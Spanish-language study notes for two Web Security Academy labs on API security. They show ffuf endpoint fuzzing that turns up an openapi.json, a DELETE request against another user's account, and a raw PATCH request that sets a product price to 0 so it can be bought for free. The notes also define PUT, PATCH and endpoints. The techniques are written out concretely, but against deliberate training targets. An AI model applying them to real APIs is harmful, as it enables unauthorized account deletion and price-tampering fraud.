### Lab: Exploiting an API endpoint using documentation

Laboratorio básico sobre seguridad en las api. El primer paso para verificar la seguridad de una api es hacer una enumeración/reconocimiento de sus componentes visibles públicamente (endpoints). Para ello he utilizado fuzz (la página me recomendaba usar el crawler de burpsuite) con el diccionario de api-endpoints de seclists.

```bash
ffuf -s -u https://0ac100b103ffa1758028fdfb00640026.web-security-academy.net/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

api/user/me
api/user/current
openapi.json
```

-> **openapi.json** (documentación de la api en json)
En esta documentación he encontrado el parámetro **DELETE**, el cual sirve para el propósito del enunciado, eliminar el usuario carlos.

```json
"delete": {
	"parameters": [
		{
			"name": "user.username",
			"in": "path",
			"required": true,
			"schema": {
				"type": "string"
			}
		}
	],
```

Por último he editado la petición para que en vez de recoger la información de wiener (mi usuario) haga un DELETE al usuario carlos.
### Teoría
*Conceptos nuevos*

**Diferencia entre put y patch**
> PUT se usa para actualizar un recurso completo, mientras que PATCH se usa para actualizar solo partes de un recurso.

**Endpoint**
> Un endpoint es una URL específica de un servidor que se utiliza para interactuar con una aplicación o servicio web. En el contexto de las API (Interfaz de Programación de Aplicaciones), un endpoint es un punto de acceso que permite realizar operaciones sobre recursos. Cada endpoint está asociado con un método HTTP (como GET, POST, PUT, DELETE) y define qué acción se realizará en un recurso específico cuando se accede a esa URL.


### Lab: Finding and exploiting an unused API endpoint

Este laboratorio consistía en actualizar el precio de un determinado producto a 0 para poder comprarlo gratis. 

Para hacerlo tenía que acceder a la página dónde se compra y añadirlo en el carrito (escaneando con burpsuit) encontrando que el precio se obtenía de la api mediante get, luego de probar en el repeater diferentes parámetros he tenido que cambiar get por patch 
y especificar que el content-type de la petición a json y enviarle el objeto json con el nuevo precio de 0 (todo esto se tiene que hacer loggeado o te dará permissions error)
```http
patch /api/products/1/price HTTP/2
Host: 0ad3001c0315a1c181e62f7800930091.web-security-academy.net
Cookie: session=FEYFky9GJFDWjfQzq2KIYvtlzGIHw7jJ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ad3001c0315a1c181e62f7800930091.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Content-Length: 13
Content-Type: application/json

{"price":0}
```

![[Pasted image 20240509202242.png]]

